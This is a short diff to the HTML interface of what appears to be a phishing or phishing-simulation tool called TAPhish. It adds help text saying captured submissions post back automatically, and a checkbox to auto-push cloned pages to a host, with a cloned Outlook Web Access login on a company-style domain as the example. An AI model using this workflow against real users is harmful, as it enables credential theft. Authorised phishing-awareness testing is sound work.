@@ -351,7 +351,11 @@
                                     </button>
                                  </div>
                               </div>
-                              <small class="form-text text-muted">Pushes the cloned page to the selected host over FTPS; the landing URL then uses that domain (e.g. <code>https://owa.textilcolor.ch/</code>).</small>
+                              <small class="form-text text-muted">Pushes the cloned page to the selected host over FTPS; the landing URL then uses that domain (e.g. <code>https://owa.textilcolor.ch/</code>). Captures still post back to this TAPhish host automatically — no extra setup.</small>
+                              <div class="custom-control custom-checkbox mt-2" id="lh_auto_push_wrap" style="display:none;">
+                                 <input type="checkbox" class="custom-control-input" id="lh_auto_push" checked>
+                                 <label class="custom-control-label small" for="lh_auto_push" id="lh_auto_push_label">Auto-push to the default host right after cloning</label>
+                              </div>
                               <div id="lh_wiz_result" class="small mt-2"></div>
                            </div>
                         </div>
